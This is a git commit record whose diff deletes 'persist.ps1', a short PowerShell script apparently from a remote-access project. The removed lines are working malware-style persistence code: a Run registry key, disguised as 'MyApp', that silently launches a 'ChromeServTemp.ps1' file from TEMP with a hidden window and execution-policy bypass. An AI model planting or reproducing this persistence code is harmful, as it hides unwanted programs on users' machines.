2b35d2311faad5ab020b496b54b86152d46fb9b8
LuRemote <paulo88.88@outlook.com>
2025-03-08 17:33:56 -0500

    Delete persist.ps1

--- persist.ps1
+++
@@ -1,5 +0,0 @@
-$appName = "MyApp"
-$appPath = Join-Path -Path $env:TEMP -ChildPath "ChromeServTemp.ps1"
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$command = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$appPath`""
-Set-ItemProperty -Path $regPath -Name $appName -Value $command
